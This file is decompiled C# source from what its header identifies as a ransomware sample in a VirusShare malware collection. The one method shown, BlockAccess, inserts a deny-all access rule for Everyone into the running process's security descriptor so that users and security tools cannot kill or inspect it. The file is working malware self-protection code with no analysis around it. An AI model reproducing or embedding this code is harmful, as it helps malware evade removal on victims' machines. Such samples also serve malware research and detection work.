// Decompiled with JetBrains decompiler
// Type: changeTHISwithRESHACKER.a
// Assembly: changeTHISwithRESHACKER, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD962891-627B-4608-868A-29B21E973A15
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mycy-178f8bbd8abd5a5024e1783c747faa018fe4aba399f7b9e234a14d386993e610.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace changeTHISwithRESHACKER
{
  [StandardModule]
  internal sealed class a
  {
    [DllImport("advapi32.dll")]
    private static extern bool GetKernelObjectSecurity(
      IntPtr handle,
      int requestedInformation,
      byte[] data,
      int dataLength,
      ref int size);

    [DllImport("advapi32.dll")]
    private static extern bool SetKernelObjectSecurity(
      IntPtr handle,
      int securityInformation,
      byte[] data);

    public static bool BlockAccess()
    {
      bool flag;
      try
      {
        IntPtr handle = Process.GetCurrentProcess().Handle;
        int size;
        a.GetKernelObjectSecurity(handle, 4, (byte[]) null, 0, ref size);
        if (size <= 0)
        {
          flag = false;
          goto label_8;
        }
        else
        {
          byte[] numArray1 = new byte[checked (size - 1 + 1)];
          if (!a.GetKernelObjectSecurity(handle, 4, numArray1, numArray1.Length, ref size))
          {
            flag = false;
            goto label_8;
          }
          else
          {
            RawSecurityDescriptor securityDescriptor = new RawSecurityDescriptor(numArray1, 0);
            CommonAce ace = new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null);
            securityDescriptor.DiscretionaryAcl.InsertAce(0, (GenericAce) ace);
            byte[] numArray2 = new byte[checked (securityDescriptor.BinaryLength - 1 + 1)];
            securityDescriptor.GetBinaryForm(numArray2, 0);
            if (!a.SetKernelObjectSecurity(handle, 4, numArray2))
            {
              flag = false;
              goto label_8;
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_8;
      }
      return true;
label_8:
      return flag;
    }
  }
}
